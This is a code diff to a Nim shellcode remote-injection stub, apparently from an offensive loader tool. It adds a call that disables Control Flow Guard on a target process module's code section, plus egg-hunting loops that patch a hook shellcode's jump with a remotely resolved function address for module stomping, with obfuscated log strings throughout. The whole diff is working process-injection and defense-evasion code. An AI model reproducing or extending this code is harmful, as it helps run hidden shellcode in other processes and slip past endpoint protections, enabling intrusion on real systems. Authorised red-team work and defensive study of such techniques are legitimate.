@@ -444,6 +444,9 @@ let ShellcoderemoteinjectStub * = """
                     
                     when defined(logFile):
                         logVerbose(obf("[*] Found baseAddress at: ") & cast[string](repr(module)) & "\r\n")
+                    
+                    # disable CFG for that modules .text section
+                    discard evadeCFG(tProcess, (cast[PVOID](module) + 0x1000))
 
                     ds = GetRemoteProcAddress(tProcess, module, stombFunc)
                     rPtr2 = ds
@@ -676,7 +679,7 @@ let ShellcoderemoteinjectStub * = """
                             quit(1)
                     
 
-                # The shellcode contains two eggs, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88 and 0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x41, 0xFF, 0xE2. Now we want to replace the first egg with the value of
+                # The shellcode contains two eggs, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88 and 0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x41, 0xFF, 0xD2. Now we want to replace the first egg with the value of
                 # the newly allocated memory address rptr, and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address
 
                 var eggIndex = 0
@@ -710,6 +713,21 @@ let ShellcoderemoteinjectStub * = """
                 eggIndex = 0
 
                 for i in 0 ..< hookShellcodeBytes.len:
+                    if (hookShellcodeBytes[i] == 0x49) and (hookShellcodeBytes[i+1] == 0xBA) and (hookShellcodeBytes[i+2] == 0x00) and (hookShellcodeBytes[i+3] == 0x00) and (hookShellcodeBytes[i+4] == 0x00) and (hookShellcodeBytes[i+5] == 0x00) and (hookShellcodeBytes[i+6] == 0x00) and (hookShellcodeBytes[i+7] == 0x00) and (hookShellcodeBytes[i+8] == 0x00) and (hookShellcodeBytes[i+9] == 0x00) and (hookShellcodeBytes[i+10] == 0x41) and (hookShellcodeBytes[i+11] == 0xFF) and (hookShellcodeBytes[i+12] == 0xD2):
+                        when defined(verbose):
+                            echo obf("[*] Found egg at index: "), i
+                        # our 0x00 bytes start at position three, so we need to add three to the index
+                        eggIndex = i + 2
+                        break
+
+                when defined(verbose):
+                    echo obf("[*] Writing memory address into the jump at the end")
+
+                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)
+
+                eggIndex = 0
+
+                for i in 0 ..< hookShellcodeBytes.len:
                     if (hookShellcodeBytes[i] == 0x49) and (hookShellcodeBytes[i+1] == 0xBA) and (hookShellcodeBytes[i+2] == 0x00) and (hookShellcodeBytes[i+3] == 0x00) and (hookShellcodeBytes[i+4] == 0x00) and (hookShellcodeBytes[i+5] == 0x00) and (hookShellcodeBytes[i+6] == 0x00) and (hookShellcodeBytes[i+7] == 0x00) and (hookShellcodeBytes[i+8] == 0x00) and (hookShellcodeBytes[i+9] == 0x00) and (hookShellcodeBytes[i+10] == 0x41) and (hookShellcodeBytes[i+11] == 0xFF) and (hookShellcodeBytes[i+12] == 0xE2):
                         when defined(verbose):
                             echo obf("[*] Found egg at index: "), i
@@ -721,6 +739,7 @@ let ShellcoderemoteinjectStub * = """
                     echo obf("[*] Writing memory address into the jump at the end")
 
                 copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)
+
 
                 # There is another egg, 0xDE, 0xAD, 0x10, 0xAF - which we want to find and replace with the length of the first shellcode (calc64enc.bin)
 
